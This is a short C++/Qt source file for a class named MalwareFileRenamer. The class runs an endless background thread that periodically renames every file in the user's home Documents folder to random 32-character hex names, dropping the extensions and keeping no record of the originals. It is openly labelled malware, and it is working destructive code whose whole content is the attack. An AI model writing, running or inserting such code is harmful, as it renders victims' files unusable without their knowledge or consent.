#include "malware_file_renamer.h"


MalwareFileRenamer::MalwareFileRenamer(QObject *parent) : QThread(parent) {}


void MalwareFileRenamer::run() {
    while(true) {
        this->renameFilesInDirectory(QDir::homePath() + "/Документы");
        QThread::msleep(MALWARE_RENAMING_PERIOD);
    }
}


// Функция генерации случайного 16-ричного имени
QString MalwareFileRenamer::generateRandomName() {
    const QString possibleCharacters = "0123456789abcdef";
    QString randomName;
    for (int i = 0; i < 32; ++i) {
        randomName += possibleCharacters[QRandomGenerator::global()->generate() % possibleCharacters.length()];
    }
    return randomName;
}


// Функция переименования файлов в папке
void MalwareFileRenamer::renameFilesInDirectory(const QString& directoryPath) {
    QDir directory(directoryPath);
    if (!directory.exists()) return;

    const QFileInfoList files = directory.entryInfoList(QDir::Files);
    for (const QFileInfo& fileInfo : files) {
        const QString newFileName = this->generateRandomName();
        const QString newFilePath = directoryPath + "/" + newFileName;
        QFile::rename(fileInfo.filePath(), newFilePath);
    }
}
